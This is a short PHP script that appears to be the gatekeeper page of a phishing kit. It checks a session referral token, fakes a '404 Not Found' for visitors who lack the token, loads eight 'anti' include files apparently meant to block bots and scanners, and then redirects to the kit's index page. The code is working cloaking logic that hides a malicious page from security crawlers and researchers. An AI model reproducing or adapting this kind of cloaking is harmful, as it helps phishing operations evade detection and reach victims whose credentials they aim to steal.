<?php
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
}else{
                exit(header('HTTP/1.0 404 Not Found'));
    }
  	include '../../prevents/anti1.php';
    include '../../prevents/anti2.php';
    include '../../prevents/anti3.php';
    include '../../prevents/anti4.php';
    include '../../prevents/anti5.php';
    include '../../prevents/anti6.php';
    include '../../prevents/anti7.php';
    include '../../prevents/anti8.php';
	exit(header("Location: ../index.php"));
?>
